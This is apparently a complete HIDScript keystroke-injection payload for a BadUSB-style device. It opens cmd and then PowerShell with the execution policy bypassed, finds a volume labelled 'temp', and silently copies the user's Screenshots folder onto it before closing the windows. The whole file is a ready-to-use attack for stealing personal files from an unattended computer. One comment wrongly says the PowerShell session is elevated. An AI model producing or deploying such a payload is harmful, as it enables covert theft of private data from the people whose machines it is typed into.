layout('us');
press("GUI r");
delay(125);
type("cmd");
press("ENTER");
delay(200);

// Start PowerShell with elevated privileges
type("powershell -NoProfile -ExecutionPolicy Bypass");
press("ENTER");
delay(200);

// Get the drive labeled 'temp'
type("$drive = Get-WmiObject Win32_Volume | Where-Object { $_.Label -eq 'temp' }");
press("ENTER");
delay(125);

// If drive exists, assign drive letter
type("if ($drive) {");
press("ENTER");
delay(125);
type("    $driveLetter = $drive.DriveLetter");
press("ENTER");
delay(125);

// Copy screenshots to the temp drive
type("    $sourcePath = \"$env:USERPROFILE\\Pictures\\Screenshots\"");
press("ENTER");
delay(125);
type("    $destPath = \"$driveLetter\\pliki\"");
press("ENTER");
delay(125);
type("    xcopy $sourcePath $destPath /E /I /Y");
press("ENTER");
delay(125);

// Close if-block
type("}");
press("ENTER");
delay(200);

type("exit");
press("ENTER");
delay(125);

type("exit");
press("ENTER");
